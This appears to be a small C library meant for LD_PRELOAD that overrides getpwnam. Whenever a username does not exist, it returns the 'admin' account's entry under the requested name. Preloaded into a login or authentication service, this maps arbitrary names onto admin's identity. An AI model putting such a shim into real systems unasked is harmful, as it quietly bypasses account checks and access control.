#define _GNU_SOURCE
#include <string.h>
#include <sys/types.h>
#include <pwd.h>
#include <dlfcn.h>
#include <stdio.h>

typedef struct passwd *(*getpwnam_type)(const char *name);

struct passwd *getpwnam(const char *name) {
    struct passwd *pw;
    getpwnam_type orig_getpwnam;

    orig_getpwnam = (getpwnam_type)dlsym(RTLD_NEXT, "getpwnam");
    pw = orig_getpwnam(name);
    if (pw == NULL) {

        /* rename it to a different user */
        pw = orig_getpwnam("admin");
        if (pw != NULL) {
            pw->pw_name = strdup(name);
        }
        return pw;
    }
    pw->pw_name = strdup(name);
    return pw;
}
